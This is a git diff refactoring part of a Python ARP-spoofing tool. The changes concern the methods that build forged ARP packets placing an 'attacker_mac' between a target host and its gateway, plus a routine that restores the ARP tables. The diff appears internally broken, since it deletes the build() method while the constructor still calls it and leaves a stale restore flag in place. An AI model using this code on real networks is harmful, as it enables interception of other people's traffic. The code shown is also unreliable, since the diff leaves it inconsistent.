@@ -31,12 +31,7 @@ class ARPPacket(object):
         self.build()
 
     def __iter__(self):
-        yield from (self.arp_pkt_to_gateway, self.arp_pkt_to_target)
-
-    def build(self):
-        self.__build_arp_header()
-        self.__build_arp_pkt_to_gateway()
-        self.__build_arp_pkt_to_target()
+        yield from (self.packet_to_gateway, self.packet_to_target)
 
     def restore_target_table(self):
         self.restore_arp_table = True
@@ -67,21 +62,25 @@ class ARPPacket(object):
                                     hardware_address_len, protocol_address_len,
                                     opcode))
 
-    def __build_arp_pkt_to_gateway(self):
-        destination = self.target_mac if self.restore_arp_table is True \
-            else self.attacker_mac
-        self.arp_pkt_to_gateway = b''.join((self.eth_frame_to_gateway,
-                                            self.arp_header, destination,
-                                            self.target_ip, self.gateway_mac,
-                                            self.gateway_ip))
+    def __build_packet_to_gateway(self, restore: bool = False):
+        source_mac_addr = self.attacker_mac if restore is False \
+            else self.target_mac
+        self.packet_to_gateway = b''.join((self.eth_frame_to_gateway,
+                                           self.arp_header,
+                                           source_mac_addr, self.target_ip,
+                                           self.gateway_mac, self.gateway_ip))
 
-    def __build_arp_pkt_to_target(self):
-        destination = self.gateway_mac if self.restore_arp_table is True \
-            else self.attacker_mac
-        self.arp_pkt_to_target = b''.join((self.eth_frame_to_target,
-                                           self.arp_header, destination,
-                                           self.gateway_ip, self.target_mac,
-                                           self.target_ip))
+    def __build_packet_to_target(self, restore: bool = False):
+        source_mac_addr = self.attacker_mac if restore is False \
+            else self.gateway_mac
+        self.packet_to_target = b''.join((self.eth_frame_to_target,
+                                          self.arp_header,
+                                          source_mac_addr, self.gateway_ip,
+                                          self.target_mac, self.target_ip))
+
+    def restore_arp_tables(self, option: bool = True):
+        self.__build_packet_to_gateway(option)
+        self.__build_packet_to_target(option)
 
 
 class Spoofer(object):
